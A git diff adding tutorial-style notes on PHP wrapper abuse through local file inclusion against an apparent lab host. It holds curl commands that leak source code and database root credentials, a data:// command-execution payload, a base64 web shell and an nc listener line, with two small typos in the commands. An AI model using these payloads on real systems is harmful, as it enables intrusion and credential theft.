@@ -365,8 +365,84 @@ nc -nvlp 4444
 ### PHP wrappers
 PHP wrappers can be thought of a code library that can interact with external services or other APIs. 
 We will only examine the 'filter' and 'data' wrappers in this section, however, there are many wrappers available.
-
+The PHP filter wrapper is used to show the contents of a file, whereas the PHP data wrapper is used to execute code.
 The examples below show how the wrappers can be used to reveal the underlying PHP files.
+~~~ bash
+# using the PHP filter wrapper to see the contents of a file
+curl http://192.168.0.1/subdirectory/index.php?page=php://filter/resource=admin.php
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Maintenance</title>
+</head>
+<body>
+        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
+~~~
+Using the same PHP filter wrapper, with however, the Base64 encoding we obtain both the PHP and HTML in the encoded data.  This reveals additional information that the PHP filter wrapper by itself doesn't capture.
+~~~ bash
+# using the PHP filter wrapper with the Base64 encode parameter
+curl http://192.168.0.1/subdirectory/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
+dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
+~~~
+We can then use the Base64 application with the -d flag to reveal additional information.
+~~~ bash
+# use the base64 application to decode the base64 string
+
+echo "base64 string"| base64 -d
+
+<?php
+$servername = "localhost";
+$username = "root";
+$password = "M00nK4keCard!2#";
+
+// Create connection
+$conn = new mysqli($servername, $username, $password);
+~~~
+The PHP data filter can be used to execute code on the target system.  This can require character encoding and can include Base64 encoding.
+~~~ bash
+# PHP data filter with character encoding
+curl "http://192.168.0.1/subdirectory/index.php?page=data//text/plain,<?php%20echo%20system('ls');?>"
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+~~~
+Some systems may filter keywords like 'system', in this scenario we  can try to use the PHP data wrapper with a Base64 encoded string and use 'curl' to embedded it and then execute with the PHP data wrapper.
+~~~ bash
+# create the base64 encoded string
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+
+curl "http://192.168.0.1/subdirectory/index.php?page=data://text/plain;base64,```
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
+
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+start.sh
+~~~
+### Remote File Inclusion
+While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.  The included file can be executed in the context of the web application.
+Kali Linux includes several web-shells in the '/usr/share/webshells/php' directory that can be used for RFI.  
+#### Web-shells
+A web-shell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands.  One of the web-shells provided by Kali Linux is the 'simple-backdoor.php'
 ### OS Command Injection
 Web applications frequently need to interact with the underlying OS to undertake routine tasks like interacting with the file system.  Web applications should provide a specific API with prepared commands to interact with the OS which cannot be changed by user input.  These however are time consuming to create and maintain.  
 Frequently, developers rely on user input and then sanitise.  This means that user input is filtered cor any command sequences that might try to change the application's behavior.
